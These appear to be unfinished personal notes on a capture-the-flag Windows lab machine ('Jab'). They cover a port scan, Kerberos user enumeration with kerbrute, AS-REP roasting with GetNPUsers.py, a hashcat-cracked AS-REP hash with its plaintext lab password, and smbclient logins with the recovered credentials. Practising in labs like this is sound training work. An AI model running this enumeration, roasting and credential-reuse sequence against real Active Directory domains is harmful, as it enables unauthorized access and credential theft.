## Jabber Machine - Windows

- [+]	Target IP
   >>	:10.10.11.4


## Recon
```nmap
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5222/tcp  open  xmpp-client
5223/tcp  open  hpvirtgrp
5262/tcp  open  unknown
5263/tcp  open  unknown
5269/tcp  open  xmpp-server
5270/tcp  open  xmp
5275/tcp  open  unknown
5276/tcp  open  unknown
5985/tcp  open  wsman
7070/tcp  open  realserver
7443/tcp  open  oracleas-https
7777/tcp  open  cbt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49694/tcp open  unknown
49701/tcp open  unknown
49773/tcp open  unknown
50465/tcp open  unknown

```
- [+] Port enum :	
   >>	Port 7070 openfire binding service 
   >>	5222/tcp open  xmpp-client
   >>	5269/tcp open  xmpp-server
   >>	53/tcp open  domain  Simple DNS Plus
   >>	88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-21 23:04:52Z)
   
   kerbrute userenum -d jab.htb --dc dc01.jab.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

   >>	135/tcp open  msrpc      Microsoft Windows RPC
   >>	593/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
   >>   389/tcp open  ldap          Microsoft Windows Active Directory LDAP 
		(Domain: jab.htb0., Site: Default-First-Site-Name)
		|_ssl-date: 2024-06-21T23:13:12+00:00; +4s from scanner time.
		| ssl-cert: Subject: commonName=DC01.jab.htb
   >>	445/tcp open  microsoft-ds
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

   >>	xmpp server connect to it with pidgin 
	search plugin shows users that already got with kerbrute
	maybe need to bruteforce users with same password as their username ?
	trying kerberoasting with users
   >>	
   >>	
   >>	
   >>	
hashcat -m 18200 file.hash /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$jmontgomery@JAB.HTB:1f25578988d68d430464bd51517906bb$98a20065c46c0a0a3acacd7be3dff0d020f61c1f88ee09a41ce9e1ead202d380b29ca0fe00657f01387c9e187f23a9ef863abc108ce73cb952b08fc8acbccac17d2c346aae9cbc250a01f3e18fb94f32f4afcb02102d551b33d261182de8d43cebdb7198e2e033e12774a3eea85dc5ed522d4475b17f097fb713a7c7818501efc801055ba834bdcfd3a67ec236cefff2e000e0fa7e52db1856119f0dd5d03a878dbcb448e70d1ba8011cbf019510575f851f72867ca29093b36be4c345d39baf90b7ee3f021538d77ee2d53b0a7c6953702431dd25ea75e2770a947fc288cd6f4231:Midnight_121

jmontgomery:Midnight_121 ## user in pidgin showwed a pentest room showing tgs 

svc_openfire:!@#$%^&*(1qazxsw 

smbclient -L  //10.10.11.4/ -U svc_openfire !@#$%^&*(1qazxsw

smbclient -L  //10.10.11.4/ -U jmontgomery%Midnight_121
smbclient //10.10.11.4/SYSLOG -U jmontgomery%Midnight_121

## Foothold
jab.htb/jmontgomery:Midnight_121

## User Privesc	


## Root 









python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile users.txt -format hashcat -outputfile

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

